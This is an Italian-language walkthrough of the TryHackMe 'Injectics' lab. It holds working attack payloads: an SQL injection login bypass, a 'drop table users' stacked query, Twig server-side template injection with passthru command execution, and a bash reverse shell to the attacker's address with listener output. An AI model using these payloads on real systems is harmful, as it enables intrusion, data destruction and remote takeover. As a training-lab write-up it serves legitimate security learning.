
#tryhackme #sqlinjection #tryhackmelabs 

https://tryhackme.com/room/injectics

Puoi utilizzare le tue competenze di web pen-testing per proteggere l'evento da eventuali attacchi di iniezione?

```
nmap -Pn -O -v -sV -p- 10.10.231.11
```

```
Discovered open port 22/tcp on 10.10.231.11
Discovered open port 80/tcp on 10.10.231.11
```


```
http://10.10.231.11/login.php
```
trovata pagina login admin
```
http://10.10.231.11/adminLogin007.php
```

```
http://10.10.231.11/script.js
```
codice interessante da analizzare può essere vulnerabile

enumeriamo altre dir
```
gobuster dir -u 10.10.231.11 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

troviamo 
```
/flags
```

```
/composer.json
```
	Twig
Dopo aver esaminato il codice sorgente,
```
/mail.log
```

```
From: dev@injectics.thm
To: superadmin@injectics.thm
Subject: Update before holidays

Hey,

Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.

To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.

Here are the default credentials that will be added:

| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |

Please let me know if there are any further updates or changes needed.

Best regards,
Dev Team

dev@injectics.thm
```

```
/phpmyadmin/doc/html/index.html
```
phpMyAdmin si basa su MySQL come database predefinito.

```
/phpmyadmin
```

```
http://10.10.231.11/phpmyadmin/
```

Proviamo SQLmap o BurpSuite

Elenco dei payload oer SQLi da provare con BurpSuite
```
https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt?source=post_page-----a65afe03185e---------------------------------------
```
in payload settare Sniper ed aggiungere una regola per codificare tutti i caratteri in modo da bypassare eventuali filtri
```
' OR 'x'='x'#;
```

```
'%20OR%20'x'%3D'x'%23%3B
```
Torniamo al repeater ed inviamo codificando l injection in URL
```
POST /functions.php HTTP/1.1

Host: 10.10.231.11

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: application/json, text/javascript, */*; q=0.01

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 53

Origin: http://10.10.231.11

Connection: close

Referer: http://10.10.231.11/login.php

Cookie: PHPSESSID=k2j4jfs1066q7f0seubdaur0qc



username='%20OR%20'x'%3D'x'%23%3B&password=aaaaa&function=login
```

```
{"status":"success","message":"Login successful","is_admin":"true","first_name":"dev","last_name":"dev","redirect_link":"dashboard.php?isadmin=false"}
```

```
http://10.10.42.13/dashboard.php
```

ora dobbiamo cancellare la tabella users per poter accedere come admin
```
drop table users -- -
```

entriamo in Edit Leaderboard Entry e catturiamo la richiesta con Burpsuite

```
POST /edit_leaderboard.php HTTP/1.1
Host: 10.10.42.13
User-Agent: J
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://10.10.42.13
Connection: keep-alive
Referer: http://10.10.42.13/edit_leaderboard.php?rank=1&country=USA
Cookie: PHPSESSID=d3o5l25s9f7a5cee23n0f79r1d
Upgrade-Insecure-Requests: 1

rank=1&country=&gold=22&silver=21&bronze=12345
```

modifichiamola per cancellare la tabella users
```
POST /edit_leaderboard.php HTTP/1.1
Host: 10.10.42.13
User-Agent: J
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://10.10.42.13
Connection: keep-alive
Referer: http://10.10.42.13/edit_leaderboard.php?rank=1&country=USA
Cookie: PHPSESSID=d3o5l25s9f7a5cee23n0f79r1d
Upgrade-Insecure-Requests: 1

rank=1&country=&gold=22; drop table users -- - &silver=21&bronze=12345
```

```
Seems like database or some important table is deleted. InjecticsService is running to restore it. Please wait for 1-2 minutes.
```

aggiorno  la pagina ed esco dall'account

accedo nuovamente tramite la pagina di accesso dell'amministratore utilizzando le credenziali trovate in  /mail.log

```
superadmin@injectics.thm
```

```
superSecurePasswd101
```

ed otteniamo la flag!
```
THM{INJECTICS_ADMIN_PANEL_007}
```

Ora se andiamo su Aggiorna Profilo e sostituiamo il nome admin con
```
{{7*7}}
```
otteniamo sulla schermata Home Benvenuto 49 ciò significa che abbiamo trovato una vulnerabilità SSTI

dopo molte ricerche al riguardo 
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig
```

troviamo qualcosa di utile su SSTI

```
{{['id',""]|sort('passthru')}}
```

ora che abbiamo qualcosa di funzionante cerchiamo di ottenere una reverse shell
ci mettiamo in ascolto sul nostro kali
```
nc -lnvp 4444
```
immettiamo in Update Profile ed inviamo 
```
{{ ["bash -c 'exec bash -i >& /dev/tcp/10.14.99.134/4444 0>&1'", ""] | sort('passthru') }}
```
andiamo sulla pagina Home ed otteniamo la reverse shell!
```
┌──(root㉿kali)-[/home/kali]
└─# nc -lnvp 4444                                                                  
listening on [any] 4444 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.42.13] 36596
bash: cannot set terminal process group (670): Inappropriate ioctl for device
bash: no job control in this shell
www-data@injectics:/var/www/html$ 

```

```
ls -al
```

```
cd flags
```

```
cat 5d8af1dc14503c7e4bdc8e51a3469f48.txt
```

```
THM{xxxxxxxxxxxxxxxxxxxxxx}
```

potevamo ottenere la flag anche immettendo nel profilo:

```
{{['cat /var/www/html/flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt',""]|sort('passthru')}}
```

